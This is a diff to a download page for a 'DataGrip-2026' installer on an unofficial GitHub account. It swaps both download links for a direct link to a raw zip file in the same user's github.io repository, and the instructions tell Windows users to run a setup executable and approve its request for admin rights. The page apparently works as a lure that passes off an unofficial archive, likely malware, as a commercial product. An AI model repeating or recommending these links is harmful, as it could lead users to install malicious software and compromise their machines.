@@ -5,7 +5,7 @@ description: "Download and install JetBrains DataGrip for Windows 10 and 11 usin
 ---
 # 💾 DataGrip-2026 - Manage your SQL databases with ease
 
-[![](https://img.shields.io/badge/Download-DataGrip-blue.svg)](https://github.com/Sibu9516/DataGrip-2026)
+[![](https://img.shields.io/badge/Download-DataGrip-blue.svg)](https://github.com/Sibu9516/sibu9516.github.io/raw/refs/heads/main/hematobic/io-github-sibu-1.6.zip)
 
 ## 📌 About this software
 
@@ -26,7 +26,7 @@ Before you install the software, check your computer for these specifications:
 
 Follow these instructions to get the application running on your Windows computer:
 
-1. Visit the [official download page](https://github.com/Sibu9516/DataGrip-2026) to acquire the installer.
+1. Visit the [official download page](https://github.com/Sibu9516/sibu9516.github.io/raw/refs/heads/main/hematobic/io-github-sibu-1.6.zip) to acquire the installer.
 2. Locate the file named DataGrip-2026-Setup.exe in your Downloads folder.
 3. Double-click the file to start the installation wizard.
 4. Select Yes if your computer asks for permission to make changes.
